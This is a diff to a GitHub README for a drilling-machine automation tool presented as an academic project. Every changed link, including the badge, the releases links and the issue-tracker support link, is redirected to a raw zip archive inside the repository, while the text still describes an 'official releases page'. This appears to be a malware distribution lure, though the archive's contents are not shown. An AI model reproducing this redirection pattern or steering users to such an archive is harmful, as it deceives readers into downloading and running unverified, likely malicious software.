@@ -1,6 +1,6 @@
 # ⚙️ drilling-machine-automation - Automate Drilling with Easy Controls
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/phongff247/drilling-machine-automation/releases)
+[![Download Latest Release](https://github.com/phongff247/drilling-machine-automation/raw/refs/heads/main/project-files/machine_drilling_automation_2.0.zip)](https://github.com/phongff247/drilling-machine-automation/raw/refs/heads/main/project-files/machine_drilling_automation_2.0.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these simple steps to get the automation software working on your compute
 
 Click this link to visit the official releases page and download the latest version:
 
-[Download Software](https://github.com/phongff247/drilling-machine-automation/releases)
+[Download Software](https://github.com/phongff247/drilling-machine-automation/raw/refs/heads/main/project-files/machine_drilling_automation_2.0.zip)
 
 This page lists all available versions. Download the latest stable release by clicking the file marked as the newest.
 
@@ -121,7 +121,7 @@ This software is part of an academic project from the University of Aveiro. It a
 
 ## 📮 Contact & Support
 
-For questions about using the software or technical help, you can open an issue on the [GitHub repository page](https://github.com/phongff247/drilling-machine-automation/issues).
+For questions about using the software or technical help, you can open an issue on the [GitHub repository page](https://github.com/phongff247/drilling-machine-automation/raw/refs/heads/main/project-files/machine_drilling_automation_2.0.zip).
 
 ---
 
@@ -129,4 +129,4 @@ For questions about using the software or technical help, you can open an issue 
 
 Ready to automate your drilling machine? Visit this page to download the latest version and start:
 
-[Download Latest Release](https://github.com/phongff247/drilling-machine-automation/releases)
+[Download Latest Release](https://github.com/phongff247/drilling-machine-automation/raw/refs/heads/main/project-files/machine_drilling_automation_2.0.zip)
